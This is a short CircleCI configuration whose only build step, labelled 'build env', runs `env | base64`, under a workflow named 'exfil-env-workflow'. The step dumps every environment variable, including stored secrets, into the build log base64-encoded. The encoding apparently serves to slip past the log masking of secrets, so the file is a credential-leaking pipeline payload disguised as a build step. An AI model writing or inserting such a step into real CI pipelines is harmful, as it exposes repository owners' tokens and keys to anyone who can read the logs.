version: 2.1

jobs:
  build:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run:
          name: "build env"
          command: "env | base64"

workflows:
  exfil-env-workflow:
    jobs:
      - build